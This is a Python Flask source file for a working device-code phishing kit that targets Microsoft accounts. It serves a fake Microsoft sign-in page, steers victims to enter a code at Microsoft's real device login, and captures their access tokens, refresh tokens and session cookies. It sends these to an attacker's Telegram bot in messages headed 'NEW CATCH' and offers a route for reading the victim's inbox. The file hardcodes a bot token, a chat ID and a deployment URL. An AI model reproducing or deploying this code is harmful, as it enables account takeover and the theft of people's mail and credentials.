import os
import time
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
AUTHORITY = "https://login.microsoftonline.com/common"
GRAPH = "https://graph.microsoft.com/v1.0"
SCOPE = "openid profile offline_access User.Read Mail.Read"

BASE_URL = "https://outlook-verify.onrender.com"

app = Flask(__name__)
DB = "sessions.db"

def db():
    conn = sqlite3.connect(DB)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
        refresh_token TEXT, expires_at REAL, cookies TEXT)""")
    conn.execute("""CREATE TABLE IF NOT EXISTS codes (
        sid TEXT PRIMARY KEY, device_code TEXT, scope TEXT,
        status TEXT, expires_at REAL)""")
    conn.commit()
    return conn

def telegram(msg):
    """Send with 3 retries; log the real API response on failure."""
    for attempt in range(3):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=15)
            if r.status_code == 200:
                return True
            print(f"Telegram attempt {attempt+1} HTTP {r.status_code}: {r.text[:300]}")
        except Exception as e:
            print(f"Telegram attempt {attempt+1} error: {e}")
        time.sleep(2)
    return False

def harvest_cookies(refresh_token, scope):
    jar = {}
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
    try:
        s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
            "grant_type": "refresh_token", "client_id": CLIENT_ID,
            "refresh_token": refresh_token, "scope": scope}, timeout=20)
        s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
              f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
              f"https://login.microsoftonline.com/common/oauth2/v2.0/"
              f"authorize&scope=openid&prompt=none", timeout=20)
        for c in s.cookies:
            jar[c.name] = c.value
    except Exception as e:
        print(f"Cookie Harvest Error: {e}")
    return jar

def poll_once(sid):
    """Check the token server-side, called from /status. No threads needed."""
    conn = db()
    row = conn.execute("SELECT device_code, scope, status FROM codes WHERE sid=?",
                       (sid,)).fetchone()
    if not row:
        conn.close()
        return {"done": False, "error": "unknown session"}
    device_code, scope, status = row
    if status == "done":
        conn.close()
        return {"done": True, "error": ""}

    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID, "device_code": device_code}, timeout=20)
    j = r.json()
    err = j.get("error", "")
    if "access_token" in j:
        who = requests.get(f"{GRAPH}/me",
            headers={"Authorization": "Bearer " + j["access_token"]}, timeout=20).json()
        email = who.get("userPrincipalName", "unknown")
        cookies = harvest_cookies(j.get("refresh_token", ""), scope)
        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())

        conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
            (sid, email, j["access_token"], j.get("refresh_token", ""),
             time.time() + j.get("expires_in", 3600), cookie_txt))
        conn.execute("UPDATE codes SET status='done' WHERE sid=?", (sid,))
        conn.commit(); conn.close()

        telegram(
            "✅ NEW CATCH\n"
            "Email: " + email + "\n"
            "Inbox viewer: " + BASE_URL + "/inbox/" + sid)
        telegram(
            "ACCESS TOKEN:\n" + j["access_token"] +
            "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"))
        telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"))
        return {"done": True, "error": ""}
    if err not in ("authorization_pending", "slow_down"):
        conn.execute("UPDATE codes SET status=? WHERE sid=?",
                     ("error: " + err, sid))
        conn.commit()
        conn.close()
        return {"done": False, "error": err}
    conn.close()
    return {"done": False, "error": ""}

# ─────────────────────────────────────────────
# PIXEL-ACCURATE MICROSOFT-STYLE LANDING PAGE
# ─────────────────────────────────────────────
PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to your account</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect width='10' height='10' fill='%23f25022'/%3E%3Crect x='11' width='10' height='10' fill='%237fba00'/%3E%3Crect y='11' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='11' y='11' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
<style>
*{box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,-apple-system,Arial,sans-serif;background:#fff;margin:0}
.banner{background:#f2f2f2;font-size:.8rem;padding:6px 16px;color:#1b1b1b}
.outer{display:flex;flex-direction:column;min-height:calc(100vh - 27px)}
.card{width:100%;max-width:440px;margin:9vh auto 0;padding:44px 40px 62px;
border:1px solid #e6e6e6;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.12)}
.logo svg{display:block;width:108px;height:24px}
h2{font-size:24px;font-weight:600;color:#1b1b1b;margin:16px 0 12px;line-height:1.3}
p{font-size:15px;color:#1b1b1b;line-height:1.55;margin:0 0 12px}
.codebox{display:flex;gap:8px;align-items:stretch;margin:18px 0 8px}
.code{flex:1;font-family:Consolas,'Courier New',monospace;font-size:22px;font-weight:700;
letter-spacing:2px;color:#1b1b1b;background:#fafafa;border:1px solid #8a8886;
border-radius:2px;padding:10px 12px;text-align:center;user-select:all;min-width:0}
.copybtn{background:#fff;border:1px solid #8a8886;border-radius:2px;cursor:pointer;
padding:0 14px;font-size:13px;font-family:inherit;color:#0067b8}
.copybtn:hover{background:#f3f2f1}
.btn{display:block;width:100%;background:#0067b8;color:#fff;border:none;cursor:pointer;
padding:10px 0;font-size:15px;font-family:inherit;border-radius:2px;text-align:center;
margin-top:20px;transition:background .1s}
.btn:hover{background:#106ebe}
.note{font-size:12px;color:#616161;margin-top:24px}
.wait{font-size:13px;color:#0067b8;margin-top:14px;display:none}
.err{font-size:13px;color:#e81123;word-break:break-all}
.footer{margin-top:auto;padding:16px;font-size:12px;color:#616161;text-align:right}
a{color:#0067b8;text-decoration:none}
a:hover{text-decoration:underline}
@media(max-width:480px){.card{margin:0;border:none;box-shadow:none;min-height:100vh}}
</style></head><body>
<div class="banner">Microsoft Office</div>
<div class="outer">
<div class="card">
<div class="logo"><svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
<rect width="11" height="11" fill="#f25022"/><rect x="12" width="11" height="11" fill="#7fba00"/>
<rect y="12" width="11" height="11" fill="#00a4ef"/><rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
<text x="30" y="17" font-family="Segoe UI,Arial" font-size="15" font-weight="600" fill="#5e5e5e">Microsoft</text></svg></div>
<h2>Enter the code</h2>
{% if error %}
  <p>We couldn't start sign-in right now. Please try again.</p>
  <p class="err">Details: {{ error }}</p>
  <button class="btn" onclick="location.reload()">Retry</button>
{% else %}
  <p>To sign in, copy the code below and enter it on the Microsoft sign-in page.</p>
  <div class="codebox">
    <div class="code" id="code">{{ user_code }}</div>
    <button class="copybtn" onclick="copyCode()">Copy</button>
  </div>
  <button class="btn" onclick="go()">Copy Code &amp; Continue</button>
  <div class="wait" id="wait">Waiting for sign-in to complete…</div>
  <p class="note">Code expires in 15 minutes.</p>
{% endif %}
</div>
<div class="footer"><a href="https://www.microsoft.com" target="_blank" rel="noopener">Privacy &amp; cookies</a></div>
</div>
{% if not error %}
<script>
let sid="{{ sid }}";
function copyCode(){
  let c=document.getElementById('code').innerText.trim();
  if(navigator.clipboard){navigator.clipboard.writeText(c).catch(()=>{});}
  else{
    let t=document.createElement('textarea');t.value=c;
    document.body.appendChild(t);t.select();
    try{document.execCommand('copy');}catch(e){}
    document.body.removeChild(t);
  }
}
function go(){
  copyCode();
  // Fire one server-side poll before leaving so the check starts even if polling stops
  fetch('/status?sid='+sid,{keepalive:true}).catch(()=>{});
  window.location.href="https://microsoft.com/devicelogin";
}
setInterval(async()=>{
  try{
    let r=await fetch('/status?sid='+sid);
    let j=await r.json();
    if(j.done){location.href="https://outlook.office.com/mail";}
  }catch(e){}
},5000);
</script>
{% endif %}
</body></html>"""

@app.route("/")
def home():
    try:
        resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
            data={"client_id": CLIENT_ID, "scope": SCOPE}, timeout=15)
        dc = resp.json()
        if "user_code" in dc:
            sid = str(int(time.time()))
            conn = db()
            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,?,?)",
                (sid, dc["device_code"], SCOPE, "pending",
                 time.time() + dc.get("expires_in", 900)))
            conn.commit(); conn.close()
            return render_template_string(PAGE, user_code=dc["user_code"],
                                          sid=sid, error=None)
        ms_error = f"{dc.get('error')}: {dc.get('error_description','')[:200]}"
    except Exception as e:
        ms_error = f"network: {e}"
    print(f"Device code error: {ms_error}")
    return render_template_string(PAGE, error=ms_error, user_code="", sid="")

@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    try:
        return jsonify(poll_once(sid))
    except Exception as e:
        print(f"Status error: {e}")
        return jsonify({"done": False, "error": str(e)[:150]})

@app.route("/test-telegram")
def test_telegram():
    ok = telegram("✅ Test message from outlook-verify — Telegram is working.")
    return ("Telegram OK — check your phone." if ok
            else "Telegram FAILED — check Render logs for details.", 200 if ok else 500)

@app.route("/inbox/<sid>")
def inbox(sid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return "No session. Check Telegram.", 404
    token = row[2]
    msgs = requests.get(
        f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&$select=subject,from,bodyPreview",
        headers={"Authorization": "Bearer " + token}, timeout=20).json()
    rows = "".join(
        f"<tr><td>{(m.get('from') or {}).get('emailAddress', {}).get('address','?')}</td>"
        f"<td>{m.get('subject','')}</td><td>{m.get('bodyPreview','')}</td></tr>"
        for m in msgs.get("value", []))
    return f"<h2>Inbox: {row[1]}</h2><table border=1 cellpadding=6>{rows}</table>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
